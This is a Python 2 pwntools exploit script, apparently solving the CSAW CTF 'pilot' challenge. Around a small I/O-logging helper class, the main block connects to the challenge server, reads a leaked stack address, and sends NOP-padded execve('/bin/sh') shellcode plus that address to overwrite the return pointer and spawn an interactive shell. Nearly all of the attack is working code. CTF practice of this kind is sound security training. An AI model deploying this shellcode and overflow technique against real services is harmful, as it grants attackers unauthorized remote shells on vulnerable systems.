from enum import IntEnum
from pwn import *
from os import *
from binascii import hexlify, unhexlify
from time import sleep

import string
import sys
import re

breakpoints = []

class LogLevel(IntEnum):
    NONE  = 0x0
    SEND  = 0x1
    RECV  = 0x2
    DEBUG = 0x4
    WARN  = 0x8
    ERROR = 0xf

gdbinit = """
    source /home/spowell/penetration/tool/pwndbg/gdbinit.py
    {bp}
    c
""".format(bp="\n".join(["b *"+hex(x) for x in breakpoints]))


class Pwnable(object):

    def __init__(self, fn, argv=[], port=None, env=[]):
        if not env:
            env = environ

        context(arch='i386', os='linux', terminal=['sakura', '-x'])

        self.level = LogLevel.RECV

        self.gdbinit = gdbinit

        if port != None and isinstance(port, int):
            self.proc = remote(fn, port)
        else:
            self.proc = process(executable=fn, argv=argv, aslr=False, env=env)


    def interact(self):
        self.proc.interactive()

    def gdb(self):
        gdb.attach(self.proc, gdbinit)

    def sendline(self, s):
        s = str(s)
        self.log(s, LogLevel.SEND)
        self.proc.sendline(s)

    def recv(self, timeout=1):
        data = self.proc.recv(timeout=timeout)
        self.log(data, LogLevel.RECV)

        return data

    def recvline(self, timeout=1, n=1):
        if n > 1:
            res = []
            for _ in range(n):
                data = self.proc.recvline(timeout=timeout)
                self.log(data, LogLevel.RECV)
                res.append(data)
            return res
        else:
            data = self.proc.recvline(timeout=timeout)
            self.log(data, LogLevel.RECV)
            return data

    def recvregex(self, re, timeout=1):
        data = self.proc.recvregex(re, timeout=timeout)
        self.log(data, LogLevel.RECV)

        return data

    def recvuntil(self, until, timeout=1):
        data = self.proc.recvuntil(until, timeout=timeout)
        self.log(data, LogLevel.RECV)

        return data

    def log(self, s, t=LogLevel.DEBUG):
        if int(t) & self.level != 0:
            print s

    '''
    interaction functions
    '''


if __name__ == "__main__":


    sc = "\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"\
        .rjust(0x28, "\x90")

    m = Pwnable("pwn.chal.csaw.io", port=8464)
    # m = Pwnable("/home/spowell/penetration/csaw/pilot/pilot")

    m.recvregex(".+Location:")

    addr = int(m.recvline().strip(),0)

    print m.recv()

    breakpoints.append(addr)

    m.sendline(sc + p64(addr))
    m.interact()

